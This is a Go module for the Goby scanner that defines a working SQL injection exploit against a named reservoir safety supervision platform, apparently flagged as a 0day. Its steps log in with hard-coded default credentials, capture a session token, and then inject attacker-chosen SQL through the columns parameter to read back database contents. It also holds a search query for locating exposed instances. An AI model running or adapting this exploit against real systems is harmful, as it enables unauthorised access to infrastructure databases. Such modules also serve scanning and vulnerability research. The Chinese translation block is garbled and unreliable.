package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "SQL injection vulnerability exists in Pingsheng electronic reservoir safety supervision platform",
    "Description": "<p>The reservoir safety supervision platform developed by Tangshan Pingsheng Electronic Technology Development Co., Ltd. mainly provides basic system services for urban irrigation, water price, etc. The system/WebServices/DataBaseService The tableName parameter at asmx/GetRecordsByTableNameAndColumns contains a hard coded SQL injection vulnerability that can ultimately lead to authentication. An attacker can gain database privileges through this vulnerability.</p>",
    "Product": "Reservoir safety supervision platform",
    "Homepage": "https://www.data86.net/xxskaqglpt.html",
    "DisclosureDate": "2022-11-30",
    "Author": "2935900435@qq.com",
    "FofaQuery": "body=\"js/PSExtend.js\"",
    "GobyQuery": "body=\"js/PSExtend.js\"",
    "Level": "2",
    "Impact": "<p>In addition to taking advantage of SQL injection vulnerabilities to obtain information in the database (for example, administrator background password, site user personal information), attackers can even write Trojan horses to the server or directly execute SQL commands under high permissions to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. With precompiled statements, all query statements use the parameterized query interface provided by the database. Parameterized statements use parameters instead of embedding user input variables into SQL statements. At present, almost all database systems provide a parameterized SQL statement execution interface, which can effectively prevent SQL injection attacks.</p><p>2. Escape special characters ('\"@&amp;*;, etc.) that enter the database, or perform encoding conversion.</p><p>3. Confirm that each type of data, such as numeric data, must be numeric, and the storage fields in the database must correspond to int.</p><p>4. Filter dangerous characters, for example: use regular expressions to match union, sleep, and, select, load_ File and other keywords. If they match, the operation will be terminated.</p><p>5. Please follow the manufacturer's homepage to update it: <a href=\"https://www.data86.net/category/product\">https://www.data86.net/category/product</a></p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": true,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "createSelect",
            "value": "user,@@version,db_name()",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/WebServices/WebAdminService.asmx/Login",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "LoginName=Data86&LoginPwd=Data86%40"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "true",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Guid",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "Guid|lastbody|regex|Guid\\\":\\\"(.*?)\\\"\\}"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/WebServices/DataBaseService.asmx/GetRecordsByTableNameAndColumns",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "loginIdentifer={{{Guid}}}&requestInfos=&tableName=syscolumns&columns=top+1+substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "e10adc3949ba59abbe56e057f20f883e",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/WebServices/WebAdminService.asmx/Login",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "LoginName=Data86&LoginPwd=Data86%40"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "true",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "Guid|lastbody|regex|Guid\\\":\\\"(.*?)\\\"\\}"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/WebServices/DataBaseService.asmx/GetRecordsByTableNameAndColumns",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "loginIdentifer={{{Guid}}}&requestInfos=&tableName=syscolumns&columns=top+1+{{{sql}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "true",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "tempdata|lastbody|regex|Column1\\\":\\\"(.*?)\\\"\\}",
                "output|lastbody|text|{{{tempdata}}}"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "å¹³åçµå­æ°´åºå®å¨çç®¡å¹³å° GetRecordsByTableNameAndColumns SQLæ³¨å¥æ¼æ´",
            "Product": "æ°´åºå®å¨çç®¡å¹³å°",
            "Description": "<p>åå±±å¹³åçµå­ææ¯å¼åæéå¬å¸å¼åçæ°´åºå®å¨çç®¡å¹³å°ä¸»è¦ä¸ºåå¸çæºãæ°´ä»·ç­æä¾ç³»ç»åºç¡æå¡ï¼è¯¥ç³»ç»/WebServices/DataBaseService.asmx/GetRecordsByTableNameAndColumnså¤tableNameåæ°å­å¨ç¡¬ç¼ç å¯è·åè®¤è¯æç»å¯¼è´çSQLæ³¨å¥æ¼æ´ï¼æ»å»èå¯éè¿è¯¥æ¼æ´è·åæ°æ®åºæéã<br></p>",
            "Recommendation": "<p>1ãä½¿ç¨é¢ç¼è¯è¯­å¥ï¼ææçæ¥è¯¢è¯­å¥é½ä½¿ç¨æ°æ®åºæä¾çåæ°åæ¥è¯¢æ¥å£ï¼åæ°åçè¯­å¥ä½¿ç¨åæ°èä¸æ¯å°ç¨æ·è¾å¥åéåµå¥å°SQLè¯­å¥ä¸­ãå½åå ä¹ææçæ°æ®åºç³»ç»é½æä¾äºåæ°åSQLè¯­å¥æ§è¡æ¥å£ï¼ä½¿ç¨æ­¤æ¥å£å¯ä»¥éå¸¸ææçé²æ­¢SQLæ³¨å¥æ»å»ã</span><br></p><p>2ãå¯¹è¿å¥æ°æ®åºçç¹æ®å­ç¬¦ï¼'\"@&amp;*;ç­ï¼è¿è¡è½¬ä¹å¤çï¼æç¼ç è½¬æ¢ã</p><p>3ãç¡®è®¤æ¯ç§æ°æ®çç±»åï¼æ¯å¦æ°å­åçæ°æ®å°±å¿é¡»æ¯æ°å­ï¼æ°æ®åºä¸­çå­å¨å­æ®µå¿é¡»å¯¹åºä¸ºintåã</p><p>4ãè¿æ»¤å±é©å­ç¬¦ï¼ä¾å¦ï¼éç¨æ­£åè¡¨è¾¾å¼å¹éunionãsleepãandãselectãload_fileç­å³é®å­ï¼å¦æå¹éå°åç»æ­¢è¿è¡ã</p><p>5ãè¯·å³æ³¨ååä¸»é¡µåæ¶æ´æ°ï¼<a href=\"https://www.data86.net/category/product\" rel=\"nofollow\">https://www.data86.net/category/product</a></p>",
            "Impact": "<p>æ»å»èé¤äºå¯ä»¥å©ç¨ SQL æ³¨å¥æ¼æ´è·åæ°æ®åºä¸­çä¿¡æ¯ï¼ä¾å¦ï¼ç®¡çååå°å¯ç ãç«ç¹çç¨æ·ä¸ªäººä¿¡æ¯ï¼ä¹å¤ï¼çè³å¨é«æéçæåµå¯åæå¡å¨ä¸­åå¥æ¨é©¬æç´æ¥å©ç¨SQLå½ä»¤æ§è¡ï¼è¿ä¸æ­¥è·åæå¡å¨ç³»ç»æéã<br></p>",
            "VulType": [
                "SQLæ³¨å¥"
            ],
            "Tags": [
                "SQLæ³¨å¥"
            ]
        },
        "EN": {
            "Name": "SQL injection vulnerability exists in Pingsheng electronic reservoir safety supervision platform",
            "Product": "Reservoir safety supervision platform",
            "Description": "<p><br>The reservoir safety supervision platform developed by Tangshan Pingsheng Electronic Technology Development Co., Ltd. mainly provides basic system services for urban irrigation, water price, etc. The system/WebServices/DataBaseService The tableName parameter at asmx/GetRecordsByTableNameAndColumns contains a hard coded SQL injection vulnerability that can ultimately lead to authentication. An attacker can gain database privileges through this vulnerability.<br></p>",
            "Recommendation": "<p>1. With precompiled statements, all query statements use the parameterized query interface provided by the database. Parameterized statements use parameters instead of embedding user input variables into SQL statements. At present, almost all database systems provide a parameterized SQL statement execution interface, which can effectively prevent SQL injection attacks.</p><p>2. Escape special characters ('\"@&amp;*;, etc.) that enter the database, or perform encoding conversion.</p><p>3. Confirm that each type of data, such as numeric data, must be numeric, and the storage fields in the database must correspond to int.</p><p>4. Filter dangerous characters, for example: use regular expressions to match union, sleep, and, select, load_ File and other keywords. If they match, the operation will be terminated.</p><p>5. Please follow the manufacturer's homepage to update it: <a href=\"https://www.data86.net/category/product\">https://www.data86.net/category/product</a></p>",
            "Impact": "<p>In addition to taking advantage of SQL injection vulnerabilities to obtain information in the database (for example, administrator background password, site user personal information), attackers can even write Trojan horses to the server or directly execute SQL commands under high permissions to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}